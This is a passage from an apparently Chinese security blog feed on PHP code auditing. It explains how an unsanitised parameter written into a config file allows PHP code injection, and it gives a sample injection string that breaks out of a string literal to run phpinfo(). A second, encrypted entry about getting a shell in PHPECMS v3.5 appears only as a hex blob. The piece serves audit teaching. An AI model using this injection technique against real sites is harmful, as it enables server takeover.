<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	define(<span class="string">&quot;CSTART&quot;</span>,<span class="string">&quot;0&quot;</span>);               <span class="comment">//是否开启缓存 1开启 0关闭</span></span><br><span class="line">	define(<span class="string">&quot;TPLSTYLE&quot;</span>,<span class="string">&quot;default&quot;</span>);          <span class="comment">//默认模板存放的目录</span></span><br><span class="line">	define(<span class="string">&quot;APP&quot;</span>, <span class="string">&quot;./home&quot;</span>);</span><br><span class="line">	<span class="keyword">require</span> <span class="string">&quot;./php/index.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果<code>$start=0&quot;); &lt;?php phpinfo(); ?&gt; &lt;?php //</code> ，那么就变成了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	define(<span class="string">&quot;CSTART&quot;</span>,<span class="string">&quot;0&quot;</span>); <span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span> <span class="meta">&lt;?php</span> <span class="comment">//&quot;);</span></span><br></pre></td></tr></table></figure>
<p>这样就造成了代码执行漏洞。</p>
<p>那么我们来看看哪些地方调用了<code>writeindex()</code>函数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608151152.png" alt=""></p>
<p>再全局搜索<code>writeindex()</code>函数：</p>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200608151404395.png" alt="image-20200608151404395"></p>
<p>利用方式：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608152410.png" alt=""></p>
<h2 id="0x03-常见函数">0x03 常见函数</h2>
<h3 id="代码执行函数">代码执行函数</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608152538.png" alt=""></p>
<h3 id="文件相关函数">文件相关函数</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608152632.png" alt=""></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPECMSv3.5getshell</title>
    <url>/code_audit/PHP/10.PHPECMS3.5getshell/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ee5df1625aab02c528f1023c4be7accb06825ca117cf20e9a80a9598cce2b731">9b1741d19bc98bca523cf47d84dfbbb085c3cf46a927ce65af6caef4061203a1255f50add100e07c84cd8f7bd5412efdb523521689ac79601c385cf07474556f8feb91c69e0b80014c9b780c49c2203e19068e10338154c0f70c3dd025d246dd5645403f4dd788ca7e8db679c5296e3c17e7ad3b287dbe92c77333f3a1518f4c76151195700c5538777df31773fc983b2d1ca7f53415c047b1745f866cff331950285e5e07784ec6b7830f1035039cc1f44486e7ca13de7e180994333e82a1a432655aa0244cfb7e46b7352a79bded371c690481b16b504e916df50a645e176c9600b80cdadcf455c5cb8f02663eb56393b9a7f2db5bc1f04ceca3ae850263fc97583a2accf35e325813764f9bab4c8791ff9300536ebd3a3fa64198a6946b9a6ea99ffbc27e703c58b0860c1c8e45989944aaf58a8b37fcda80f1511725e6b7490908830fafc36e6c7d9750305542cd68b89932a34f156696c28b1bf61f7f82abbbbc64b93f0098740327839ea6dae1949492c4df6d2a7e2dfcb50d1ac70aaacf8632478650f47e28a40f8872ca7c8609b781a9079d08b35c5c53de48dc5f255d4c9b6310c6d6fe4ac7ef69f2da0016315fd563c746e8d08eb2c292b0923cece7b5ef0fdbb213cb39545f7e0f0bd58546822434caf5f5fe99fb32334ad0bfe9c8bfae85ce7bb90feabd5132c2eaaa9f90aa0fc388927a1a44b989e701f892d86d9670e09640ee4fa0c44aca24efe6bf1e6c16a78447ef9df4951b01244182f5dfdc68bfea0da2a5e3c29ac7abe6ef18a263f6821d0b9d23ee3a3a4d34ebe0506de7aaba3c355dcfabc37f4ca4c04742cd0ab6356767265d18a4bee0b5137b0d1957a22f1b0e71f5ee351e9cfec83df8dde4f5a9474d1fe21d3f455bc96671b2cc28274931fe00b8d57bfd710d373578319d7797e99b64b96b341a2c449411c584b9e24532f47bd697d3a0a549a7daca9d0d6664710cb10cc4b8b5dc9b63d40428c005cf813131bc703cdbbaf8d7f71b1ef971ec93996bb1c61e02fde73b8748aa94871b727f1dca8ab5a94e447e91c13a339be9c5aa6a370c4bbfcbd25c8bc7dbbd9d49eb94dd73fc7cd2095153a437273a0cde7d58edb5a6b3ec7a2b4a6ea20d6dddf0e2ffe3b7f26579f65740ec6cd1506c32727962a9fe164be2212320caff852527352b43c152b4468f1f9aff265904f6761733f018a60f3dd3e043fae7d33fd7ab1681ae711a9f49f3e35d699d02480b548a2f0422eba3546a83e140ff1e5df1669778502efcd6f3562fe594b2a715ffb73a6ffdf3926c4cdc35d9b40f33a2d47fa25bb1da86df93e5fbe75a032d90310c0360f3e37fdbd5ef2a26b7a56b7502a638e528dea906e2501c477a27ff1e5b4698976832568b83830ea50b67d20c46170224fa32950c4617207c55c2cf18771a7683289b35c717ca63f1d4d0c96753f8fca15b6c198883450d20eb102fc62bfc8d7c61f630920e577ab06b809aa0d3860ba989dd1af4832aaee33f098ae51cda93208b4f2d821a68df207ee4b05a2b0331028f7367d3e6c1614cf62790401b72c8bbcc175c89a61f8898ec9f6a95f7f0e6519b5296aab3206ebe7eae6273a615c9696f28c068db77237a26d4a000657f46e8a444245209f3b58fae637a5cda92d56ec08647a8e2a53fa348c0467db638b118cd01f071e767d4f2233f5d8cae9eb02322f82fb9389b5d0e4d32c02c82baa296ef9c343358eba052643e3fc9c60e154d3aa9f55fe64d1893ba011887ab6beec173b43bd0d803b94a6e34d03b5d8393fa6c2259969b568dba72b37be8d1c8ab5d696971f626a51718a1d6129366d301b6015f4162571c685a5da42f8c24676b6c9402e1dc9c625e89fc6ad1a63e20810ee967ee1d2aeda712e88ecb25c6ff5cf4166c31d44100926fb1fbae8d8d8ea92a6fdcd651d99208fbab24cdcbb18bf7b8018f8e8dc7e4c720ed6e3bef94214a4e7550819bd5bd991677b700afadf1182b0c2a37f034d6ea5de7c6b6f27b3eb5f95d986229908e8b3a0a80dfb20e03a8f77e7c90b941df345ad4744631d8552b13eb1c483fe8680a04fdbd7abf1feb1083979089bd381600718f1869b57bf721ff6ba1a359700fa1b20c94060910b0f668fe2fa6f5ca683893e10ea45e513cdc240fd48b9c850eb556de3ecf0f099c49ef607b3e8ce639350a5c43f418f942294b1596a840088b4024b85eb8dffd5507baae25b6dfa27dbc228d20b5cdcd007dfdc4ccba4af9708b8b6d2961f43e1379cb49700ae6751e5854a03a62f732e7e18abdb1a6196b86231c6c93ebc306bc0a344c6ae3318f7349f9902ff4ac0264cef0915e26505c885773855d1002c64ea01397d429be84919550f8333f8ba325c1a7780f8f3046f1fc107d0349e7dfa8c15142b93822a64c7383903085d862b9241752fc8b1a74a9280140749f38f0ff9b16973fa1c6c11b3161e92986e5f90c8824a3c375a8e91379312267e429d9685fa5c75a75cb55730bdd9d12438a72478cde06fea156ed2ae768ad7327d16f8b6edfd14b2b04dbea969cc8a73ec690a0a66a69d5e95b52e615089e2a0592b4361d2ebc1232d0c3b0c74d9f6909d19594f92a78e75bf26a84e0f66bf9c6616a3f305c0201059988243f9de2cc682d975c0a9e1e12e54b8a5e8a86197ec0a7cefdae9403a70b92aa1623af021da2403d165f376f459e931eafb08fddca99fefb6f97af7cc1ccb3a98a60ff91032593da94d3a15d659b541a623b7c5419335ebaad4b46d140130cb73ec7a7b5a4f3c74cc244118e2c98b071f4c75a43c0e88f3d587558dbfa788de602dd4920e504f6e79213cde37f5bbacc489c6c98d6d58dabbd1cb32dfacfcac4884eae3f9d518741bbd1d024881b1cdcf609dba8aa9ceeb3831291f185640f6708149f67c33909cd88fcbd509e6aac18ca9e9227e1c480f24efcb791a2682ba4f1c507f1d836df4ab08be6f90bad69f84021927712f42cc2881cb7b13fb8e058bc2191c7e77a85b017f9e4965af5169b70226bcf08852eda735331532738895eb1b16182eca14159c32d73948c4586a4967eca51c1df03d43ea636443cbee884a5d0ef9601bd54df9a642e6bea455bb367f975873a1e7ad63d95e46dde43056419d0c3124548b738181edf7374ff95734506c4c4021777598d3d470caa0c21c41a24f90238eb0b799d31bf91b6810332439ff360dca30a33d0491c9aacf6d5fd37e34d697594ae73f452b5d060844214126bee7b35a3ba2cce6cec8932ba0e77250b2eb69427b4685acf687ae1da1d1511b634f078557cf89372fe4e2f2104f3d35f786619ed5db79a4b987d252ced43586da538a8981d976c546c72654caeb6f549a313097758d6c2dad69f8606e6309c6c923c79ac5fc246d94b8c44aee4747ea8096d42a180893f4277a74ccc79b1924e1c179b40e3e3ee25ec5dc12a48d7c388f3fb7656610d2422416135d1162a06541fa6f91761e9b7d86f2badcbb5443f6719b44798e7056ced036ad876083d2e0256fc59b4f43c7a15efce84daa7cb16faaab6a25766a7793e38da4be7173de59859ea3f7839eb550edb86c95388c0366d62d0a7cbc5465d6150101403acb0c6fc1a63eb056090e2a56014ce301b302df6a804e0cc6c2b569c875f5e566d64cdcf0d4ce3db73c210728176e9ee33d5f82c01bb97b3743521215c94e5262fd79c7d100a7d02faa7276be5fd64c32e1fb6af42f0a93db13aab562aebf4ea20740da29fc705c3f76ab1752cb1f205924d421437a8ce186838ab21959c6db5b8b1b08bae1a0bf31f254ebe5cd3cbbadbe07621f86c06cb23a37b556d7361aa661a73fe7e28f1322331242ffb0fbed2a9c76ba6c6d44e7a59a0f6f8c68acb0d8af40c99194c0530f0ef2aa9b833af18ce1fc351a682e827fd5a6a514039a900ae267fefc73d09c518dc668f7a3ca9a702e80a6f7b3b45ed0a71aafd45c55494d149d5d9dfbe1f72c09f19bfc87b743d646980c2b6d2ced37b7a53dcab9afb7f4e13d7f62cca3628547bd78bd1c67e19317a2edcf293a8a8f8c6a2c1c3d2140a06420febd0b479665ce6dc06a4f5ef61951f369ddea2f52227103f89342e0070b572ce49e470e503ce8b5ac16f4b068959374f15291431187ed2732c167192268f412b99d7ada44175f02a01bbac69aa7ab63abd52406ce6cb7ee73dca6675f7544775b939787775f7d62beed965cc7d1c622091ec0f38e067b4c2f7dc72506576a3ca5a67035f7bf5e0cbc8a0af11a9695e242da59487ce107c29153d41718c1ccebb1689298ef60a75e2626db985fcf3b139c065367bcaa2dc45b24c9e94252e8dedc1d37f90c677b56bf41a472b7b5ad4f53bb674390223b7ed7d31d4982e7dd1fa1d3523baccc2114c9e0dd08a44570d291ce3df1ffeb43ea83c5d72d13f9d3de90b342656a0c844a6825419a4502288e73f21e3c5e4c3c90069c5179b2c9f936f8624db8aaf056ed7e52571b3fdab2f78ebe16aa381a4c45faf2da4c745b826008d418d78d99048c10a929d00679aeea25b05d4ada4bd752ee70019881bd289f907f6c57b714d97a971027bdd37a330b1a502f1733821b1de14a920d38ef491fdb9508e3a0f9f6348b0b3513f3a52c3177e09332a6485013ee25c4a079389cf5c5193fc3b404cb2baf8252daa825c0dac5ea947a4a0ad5a9d6295f1295cb3420d3175f1820f3a30f70dd616c1a79129531d66ab9e1cb274dfd9314953e9968e472cfba4f3344052e5bd89b7eef33f4e731b812e4b66c2c159c3b0b05d1bf20f95c846b8437a4c11f485decac4c3b5c4b83065db8a7813d69f6ded389202dbf04e5ed4f8c7c9377892616c69f4e9f0999fe9c6f484000eaf32bedd0275f6954be81a29c39f2b3b28803afbca0f1a007a4c57b958c82bf892634b803b61ed97ff632af7bc3502228857235bb4d0a918c503412eb40fbc858cf261eab1991807a838bc2c120184324760c7ac95d301786fd74d072a586ebcadb98641105709a697035bb2577f888deeaffd17819a4cdacd33000a65b30cd06d04f1f347c03f56dc1a432c9d5edcb211d942b29a9d0ecb5347a2ccdd5dad1ca730da407831436828be238fc63fd35ddb4858c12b66b78cdc263939d54089943387de1cccceddbd440b711d69f201d77e8741f8494dbc61488392f45b7364be2c41d1389c1a9daef8be3dc3bc52593b55fc8d96e025050d71708979224096dcc78e691a6fd718fa8249bb56610233af7e13aa88c732bfbfb77e18552b19f7269a320a8fde62fc9763d58118e5b608bdf296bd4390a4ebce194b67fb02098559815d220a067368f597a529a281eb3c09a05e24529a7431f203d445eb8c14d272774affb102967b0512b7d7dcbd8e48a656c38955eb81a1c7cfef5b6ae4332e34a7d40c7c8c455a48c42c5d400bf36021eb48cd3785eb4c2bb8eeea66dde6b56d6b3555e48b8fb0a32a9005282cfd7c003691a3b50476532bb1a394bda3b5db28df8d374595c0f9c35226d929e54cab3d5445b61387d19c22cdd9a13a8ed1eb57e1425d1c941e64da9a146fb74fee6ede73a041425c97b467739653eb44d250a0fcea86cc4e2f777a7e89221369634f1ccc1fd38af22dea8dcbe8f6af25fafe3525cc3fc0e77418b410eaa67497dacd4658c1716feb34449b12a79ec4851f4331d0fd1858f277d111ae07fc4500cb58cf75d159ce124b82b0184950e493140bcedf2085ce1ce2935c7f91434aaccd573d01a95c11776e59c2519b8a4600f8325138096db14d7b601199055f2296f8aa03101cf65fd711e53dbfb15b0ead4a0b028595d037d83710e11bf5f478963cc48b5cb6f401fb328cb99c51ec7b9d57db4dbbf9736c8e23b598ee7e4d092b57efc96280499ae6ea9d5485729a1d251885770a96b9eb0d68d3211dace150956fcb9a26202e4864f74093d0f18fcced6898350f1a9473f7518a2ead7f8204dd475173017dd0f457e199232874e720af67c27fc90ecf4e376c50d21d924e805373e753abf0b50731f685ed4cf09483a201ab4a99751e284252a4fb0d4c0ba5eb96355f7f4fefc791ed937bfcce815f29659fc4ecbd711ddb36ac35e3bdf0a1fd5ab2965210d0a052d85c9db598c7dbcfbd13211918750702d84a91faca44dbe7d145f9972bc274e408fff78ec7eb50f7c0f5c84cba3e7924b4a498643196ba7e34e6a7e60c864da64b5c18b25116bfa256299d34ded3d0f3d037598b6fc59883c3844c01113dd2b6c6f0ab67d2c77a289a266b30ac9259a20960fabebce9da84fa8d9c3ffa36e2d93027d53fd9fc879531b67b13ad54f9c927e583959f0092598ac197e561257142dacddb177e3cb34df6caedd3667a4bfbb6bc59c5945aa458b7442df44f47cce1bd24e744d3077ca7cd46343d6f769309c7a21da837eae617647bd49b54be039792f3da1f03e59947fa8c18ba7965773101e4f9f91c4708b795081f29947d1c6585325662f721ee793c5003c3612081e42315aedb4c2797494d84111ca969cb113343316bfcc93c58932ec1301b80b9ac5789a8218d3bf091fac2a3c5ee8cce8e7908b698374ebd1dc7510ecaecda3fc9f54b6b011aa3de7eadfde5febb5836e5c984972228d0779730a10dc51a8dd329e3e533254544eab13d39c97f449744ca9b9e761a78700db5ee3cadbd4dacd01180d9e6dac27b9d40005a3fb9e63d27a5b204a3ba25c4c7e2a5f928e91e4232896246ab7675ffc1a83da19f313356627034082a4c76253f2c13eb30c310498342c36860b5bc99fa50b1c70871c06996004fc879b914e8f87a4880716467c70662ad89b1c9814648dca491071bef865c0c6d9786edfd958b1cc75cc741527488a8716fe500297bca66a14fa960d0e85e8c706a84e87e74cf3854c35418de0a17e3a9e705604cce95c6db1aed5831cca0f76f2576dd74678b43d330a2a7fb3bf32465140bda451c090d1d038b196f8e5bc5fdd1b8ec16594924172923799982ccbd7fd27f82f82b0f22e6a5861526b972aa7dd82426e970b90f5ed908321435d6f343bde808f40baea84e6d45a712f40ddf016ab9964b9cc3acac81195a969b3f2edbc4175201bd509ccabff81ec3fd02d6cc1e9428a1b1c1d5a82f0ec3855c09582efbe593e83ac75f62df147132ad429e96f1c1501bedf00f3503c18a532643c453c5fd17652cc072d7eed4ba4acdab3d7a21d5525d98ae7a71a7189254310bb5a6990a96d9a3ca6325de40a415f556a0c9a4fb15e13e87c2fa2d208922d9d93f6c9d0fbdb6a5f36932a6c95ba486e4c875faeb89c3690923b4576455f4dbe1865f4a498fc8ead6ecf04647b2b5136be59e229baf4add25f8a99c8075e4147c26bee8ce6d79c8b0eb9e90c3bd6978c9641190efb20a2229d469f54c18ae887b2d2eebb7014c67b415b4a235808b64858f47c1bc6d7122e44a596eb991991a396303b7f6f3f5eb57bce5124b1795e6c32546b1a124b3db9dc31933f1b3ed4a24ea23f36d1ac6153be558a03264bc5b167e80378c6b8cc3e7a09d089c1e4a01a1dfe06121f3621b2faef4caaa74173c29f3f6fee2e845a55daafe44c31ca6b87ce7e85968baee28af3227e3690f5e0808587578059ae4695402cfbe3f9e11626d69a6a49f9f23c8922d9a42d2a14e2788f48a0e21205534ba487c93d5b4ca9b6fdf0fbedac6b62747e4534d95dba304c863aa6d6fd300a7b581ed687253aeee15a0e76c782e7b165a5f500105bf5ac9727a73880ed552e154c53e0322e297c3e9a5cd26024acb757cc7e337b8dde695ac8ca7b071ea49db82994d8e7a80fbfb66feee8365f0aed43a960f0b5d52b11af4dbecf37306d8497fdf11eb09afa317188e9e87961ce4d972975ec1e7f4fb5e9f906db2c73da6aa8fa63129e96c0004da9faf923f4fc2f644150e7943614c8abfa2efd0cf54ba71a971f1cb11703191550cc6141e6211fb474a20bbaee5f3cac9311b9846b24ed4a2d3b7f0171081db01a32597393ebcffca137e18ed6aa91dfb46b3417f6e687d8321daa7fe93987f6ca4b09702f055e6ad4022d11e7480da88d4b8435101ab0b5869d1b5a04c9ab5131d2b7699197262ae6445966fdc7b9f9b4e1f3db58f6ae5ffbb6763f4086eb15d8510541407485133f5f6acd97db393768bd1d2efd4fb6b4570eb61d9354e3ee5387962d41de45840c116559621078a19da709bee5d615df65fd1f1201c5c46588d6478133c680e8d48730175297f83f8844d4c93963c6d9dacc3088f62acf802e865f643c899009fac3d8db167215352a18620faa572195ce2e79793478f07c35fced176a5acdfd4e9be176925c49ed3f838334248b812592c85aa0b85dec55795afa6976a3d75a6308be21e07918285d7e8ea13606afb14b1f8f3f959ec754dad5a2983e42e9829598da2a8872ed23da05f3abc42d7b9b96189a2ebc0f931186fa887d3706fdaec59f332af02887fe875d6f2f9ab716463f4c09b19f5f19154fa6ed894c40c78318e35e9445eab501ae953aa8526a210ceadbee1c5945eb197ca99af2301ec025a531fc0d41876c563649ed67cd87bc1b522e02f13f496d482962ab5073a60be3753c1067a52a8336213eff64df52ae86136a89cb3e845b6353a95440f88742aad6ac79f530cab5eda0fe03815d9ca366af933500935c26fbec319abf0ead8a415657739adac8a00732d02439b05c40ec75eddadb312f6c2221431dffae8ddba3b531a4efb10e81678b79bc6850a2635e9360956db8f6e040e9fdfe55e550c57cadd2783959bca4f8194f20f9b3dd12651a577ff198016272d8b5e13dace678c5132aacb6ad330b52891264f34418cb9af3ef35edb0f58df30da2eafd9707590a71b53e20b8bda424211bd1fe51bf69f5705ab4d648887c0019cb132f35c1e93b374d1bb72e4d1bd7ab52a4f14458ea5d85fcd98117864ae831b06640b3934a7313daf9d0b3eb61214e051456e99fa1381f573e28da31a26a65d2750eda714479b010ab5ce817646b6d27a86e9def63deb8072694519c20f78f8a18787eb7fe25a480061a5c22e5a98ad6162ab6bcd72dcc6ad70fffe80e76a43abb3d5f9e6da9affdded6e53fe8d8fc9eb274327331fc692878ab118eb32383f95002ee07b23868e731b653be785671dc423aefc3ecade821634edf09bb8f22ea0e8aaf00f22ccf25034ee976634cb0c4cf78a9aab9b5920e0ede4f78687aeb991d72114b9095c6d438fab54f6144991754d1da5544a0b3805d67646893393e52a9ab37cc4c8e65d88ce91ee69e89405dcc7d8e3d0383734a484320fb0c199b3d3a67dd0eb605f9363a59e0276b8d82adf8eec20c72bb20a8c814fbd7b8e3000710339e137dd4e7efa9fda535f1c1148587bebc0bcfa88e5e4a9bdd45988119e681ec4c09f3f6162c873f5fa27e6ab1f2eee56f0d9fddd484353053a534416f98bbf86748fd97f3b561582b41619f28bd499f90a27fc7da83ee3955d33add7dc188703f2d63ea6459f9626e583dbafdd9e342de9c0da8bac86b2b452b6110adff39234ba166cffeb046a4b1f67b5940748230175105aaf563ff6a9d69b7afed64dd46a33eb391ee286bb7e68a0ec17001bfbaacec478059b012da021c575192a31e3291fd5c82c1e705b99c4473a1c3552e3caeb5caab2aed260a07cc027281038b37d1169eb792846adaf99e4390b0ce0e9cba1feeb362fe386cc76bca88a34c0c2dfedd99ec941c192a23f09c18db5e6ed368dbd04116ebd7fb1c3e99f85ad52af05a14eb565e1212b6cfdeb66204c2d058b719897e8465ab4967843d706a93360fc973e73f1da86b0abd6bf423a7b1f41b5c7c2f008fb49352fa2ad68b6a0e78812fb6379054d5acf092777b4680caae1d361357dfb8e8cc2714e5d54253082f32b06535d41c0d198f20b630e891132738586977087979f1ecc5e183ab0432f66c89eb11892792c9887df915d51e51e6c6b227a133bccdf6ce407a98e872ed07114a6296bf7bc99c6032935e06b80509a41b79eef44714e9ef84cdccd1e7736972094557889ad08058693a96f7f8b8fa197da1b875d46feedad9a53b6179c081af489bfd4f58d9306e2c32092049cd9b383a0e8384d6a63283f9ccb1a5a1cd1887aaf1f0041271552417322a531c9cc956232c86cb79bdb668032ad9f899245fccf60a808face2ea0554a25ddd7c0d3d6e1dc3069549d894b7cfcb97ba53f9b896a0ef69bfe048d82a5e5a56ad9f23a36fcf23145d4173b8a60065c363bfbaa6fc6d552c4f3afac0ea90a56560f1a0ac9681d05e3d4f75478f752d442f1d5a3eead57de71918d367fc46b733256439d13f86f147e338fa837e14f4ec4243e3041af241857adc71bbb4369eaf3f66370acd86a985cab117e7e85d8a1dafaf6dd06e0014cfda8fc200e64896f9f186a853d7e971d8897a054f3c84096d80a492e84a83c98ef85477083ae2635d8e50739d11e8a1869aee951202bb873be1110dc8c1e625a045ca76f9fb9b5368c33450054d493504d06fec54199cedd81eb94907f486125594c881fcdaf9013bc61265a1d35125f73bcda3c755cae7ded3c03a186c5f30c042859c4c8b49453261bc314009bbf37360fe04e8d0065899a120c5f245266dff988e0dc63cecfdb74c6b043e2dcb2caa01ed701b56ada02444bd5ddbddae62ef48a9d1bc2743936cb354b03f7d4b526f69b74394c2d26d8ffbfa512ea79a3672a4b2176b217359022fac4a2b99627c301428e7bfb12901f3a3f51634da15e0fadb8cc280d19cdbad7a144990c3f54fe21f72439ae1da722a7717608bba5eb14a90cf101c5879f7bf5152bd64a5028a86e6e05113388af28dd4c37fe22b1b1351eb2fc82829004c1c4dd1221a516cea8022c3e40aaf81cf3b331e7a601e73e7efd43ae108747892f350f8cfaf31ca1ddcf23126a7f1b90ed11224106639522bc3b939f70f717a81f6501aa03d6309dc2b3980bff44cfab85e73bf17390abbad978420a538dd260133488018c2d7f634ff68e7b3383e73c4943fd1442e8451092671d122ab07f550a68fa991d310be59c97803b9058db45c286620582641987e31cfa9f79b2d59be4cfdd2919cb13f7107d278d68e2c9da1d754a4265dbf80a25abf6952d1402a55594e0639d0239002c5d3ee4ff642de997a14fadaa2d49acb606d1323836f947fd9c7332245cf58e7e0611d64ae765f815a9772a71d95562f5b887d95061c2fc65a5edfd50d2469fbd4c06a73f521cfb3c7fcf9870f7f4e3b7a03964b6bb8e1d1d55d30770c692d4f1fb149ceb195b47460713f2772771a0cf907f2df110b9546c33fa04f006c8e19cbb5379a3b4237e210d8460f48b58485ca6ab7006331b37bf6ada7a194e8af04ff1893b5311d0866d798fdadd28c8b12243ca805c4cc686b6387c43c7f1dff1d4e26d7a0a981c58685d41622df57d45ce9b61f2a5f84e2695c4e042385937ff98f77043a274085f9c4d694d4042609b82c9f8128c3bfb81d1298c2b3daf357034963eead5317780f46ef405bb5e4f71fed19c488e9b17bfa233248d5b61db9daf192ac8ba9e3838a66fdd803f76c70161cc218cdf5cff4ae702e5efd38cf68d84d204fe36c1b290a21610c5a0b0ae7ca35f2ed9db6627b8bf9aa21a48178a43db79402ea246a73e2f59dff795f1705a20a607d8a91d21fd170983593dd1001834b1193674b6cf659a14594d73a669604c75116e58b23c857c5196efe833f134673a0b9173c5c4abdc2570a77e898c5d70295da5ea1f047ffc2a17e4c5e841f1b3931fea6fc304840f7b580ecacbc8096850defbddfe8ee5c4ee90a54fbd91234fa4696152fe465a65acb7a59e24f128ab3a4642a956dcf5353fc9bd7deb2cc18f982c6b5fc0311cc78680314840bbef8907ad0e223adcd0cabf7be5b9eda80f84f85cd43fe5a9b2a2a50e26dda490eef5d691d2076809df2238b3dd71acd9cdb7a3f2f5e2acdeeb9a10267b45a9e9140219f29012bb07b46b83183d22f6502af11b26aec90d5c2a6fe19293fc0a3d39a9c58739e388058295cdf844a7fb2fabbaca24a49d399f584f14996560dfd5617389e3323f5c6fccddba8115b6cce63a506ce68f798415ede8300181057e878d3ac7e0c018a6ae6f15b3b1d1a6f7afa4f177d023b7bc3ac012d9d8a7023a36adde137e20024199a305016ad4e7bd1f52281169f60c87eba555ac809ca6fe16efac38a62f896ee55754ab9df4aabd8429ca01aa36e36ac0a766b444dc317b50d206c6a7d18b452cfe62fef43215246978bb65a2b4f5c347086d5bd35b8cb4b5c8933a1623b151bd68c12e5e0002d0bb942dbb02e1e6ff1a3ab67c23907e480854ed25e050a6cc136d0bd9d05fe9c7e999fe0d0b45be17885a7fec7fbfcb46b810efa90f62bddd1a295db95ca256d0f7a323e302ab2d81d5f1e69560a93d4fa01f78eb8644803a3da76f99275bba8acc306e21a35cc0ced252a8ee61331cc1706b590015105c669f783a8b70408302ed51af84f13e1fc1251d57880b38d6e03e411220f0286a17707ffa640a468206725e33bc68b58f7afade027fdb72e6e7ad9e3fc62b5b615dc9a410c04cb82e16168aa3565033abee8cc9398a4db6105bcf24250e58ea1381ac57df73342c652d2a36c3ffe42e9c2fc3ffbe0de465f1fc0382a1f3f0e11c71ff80901b06925ae337e8fed04b4113844c3f7eca2192082acb5caacea32321f4d804193597d74b1500190e6ecb5ff2ef93abb96ca54f0bca10b22e4b027659e5331c06cf97b899d9b69a939f37390e74c6a5a0f8ac4763c3d90d4cbaae347d868bea21e847f7b03d4e7ffc4b5e419ac745546f9e4012eae1f6c94cf12e1f3f7583cf59a9910b066d766403a9845f9be43c0243833ac89dbf747e8ad2c6d001a7c3348ba601a5e1044c0700fd942533054e3f6bcfd9ee8f2efac623c764ad53df2d591c51350e880efcc83d2024d129d16157ed7bacd26975d23e621d8b3fc9a522f8b0ed0b825619ec193feeb9789ec05acab350409a787efa75dcd9163e08998a5cfeebb2303693e146d716a9e04c737c45f3408020551d31897f7ec2a0787317c07b7b014965c962dc575a43e666d1c7c206825d893c672e847ffe48557307a2abac64671149220858dd971603fb091eacbb0d8e257ed2959b096ce7c709608e6e6b2f79405c75d2b68d130ba182163cdcbeb8c4dee0368cff09de23bc4962666a0c7f7cf6e5af27844952a21ba1a0cb5c3cd0b42cbd0625c27ba371012cc75d8999b557d666c351d7eb2a41bc2bad1097ebaecabbe0f8441d5866d756eeda66ce8b262fd3c364f06d699c65058da163dd92a1db2f64d2ebf95eb733356afa1fcd7d23ad3ca772bd7682b0ba3af5295b6ba0d1883c4d08f003275d939c5eb314d034985bde50eb04f2466bf7a92baf1006579c20624a105d069ebdd98a79ac047d2d1c88fe9c7d1cffe58a7c25cdc7b57218650426aead3b170f4cd6579a97d0689ac07d95239fff79b30d26dba8b0d737b5642b1d840fe4fc1b118e2cbebcd0e3ba239027634282c93a2de57277dd9e2666d263fcdaa6212fc1df553e0fb9b3d9777f61f397182afd8846483b37754414fc891023e652c49cdd9be9600a02401aa046580e4571a72e1252b3d426077f578753879515d1ae29c46b584b99ff47bab9ac74f1a1501b606d7efc89c6328394f9bebd15b30c65d70ab172608f008e25f171aec309e13deaa14eb03e5e923e6c4fdc23b0af426e17553dcd27230ab4bfb4a87abd903fc626ad7fb804ac9114a1c7a4afbd53a45fa8b133d609fe495b1ca28ff69a90f5a0f9b5c75854f79e8f76f915ae5ff23a64a15cbe38e79883ffe68b090f79fc851e2920fe967e56dcdbede2880a456eb3b66eac9c44cc4c9bdd309a325196e4c25152314878c0ee3b40ad5581b6d8192fff7a339da5f067436c220825d102ce89b6fbc532f3d3af686391c0523df9c920762867ed0b2059c1b09c0de7bf32ac05b21c8875a77404baba3341198bb59961b5284dfc15274cd579e14895762ddcc19e82716cda8115b8b76c51d779af1339f759a443432b88e7e0d607a32fecac99c8329164e48ebdcf1decc6c9888ecb9ad76a81642b5b7dbf0dac0d4551e0d0bffbbf2c3d7e1cf381c87619bb8319ee782ac80eb9d68f14704a7248bdde326eb49965b83ce223a60004014cece7c7a1ee1ba0f30890d75e4d2b9a7930b9b2b9e68bcc33777c20a4e9d04314a7e16618194290b9214ede3a311397308a50e8d3db4f2ade5743a8de4e922928e6a5a8a184b9e310a2ee4038ae1f0ba78565104f61984d4d7c7781fb1cc4fb4350d400f854fbf22684f3eee2d1af1630a67c1f552fa353eae9b2b55c831b35713c63059cb9838ee2c78041e8e10bb5b3e23db8122afc463c4bd92d216905246cf095827e3d4f405d72efe164ecb460dbccb15bd4fae209d13ad7a93a2142e8bc2ea2eb58554e8807d3891d67af5e198e610434fe6aac462d972463eb65df89177705dc665e63bcd081b43378377b46edc7bce722b76a6050f542c35932ac7edf9922fdd6344de23d86d97c9ae32d5087d29ba8e0bfd0e1b99aa0490cfca5f60b4f534ade9337e159d0368ad1dae90ff0f9462e0b3eb14bd62ae28f17a426bb72a70bc97fc50164c3316393968d9f6623b0e271ec32411768200467e64a89fdbe6ffa418b0cdbd09ad2234975c1cb672cd8b724652a63cd29f7f397843c5eab00d677168682bf6c3ff32e0a84b63fc56bb2ea11cbbcf4ef16f82a9e52161efe00ee25a752bae8a8092b36ed93a07b4f00ea34a865d246e3c62bae161264cb21d1d822f401759322af92da74205dfa0f8c79b3a51422d3c7c8c16e0738ebe8bb4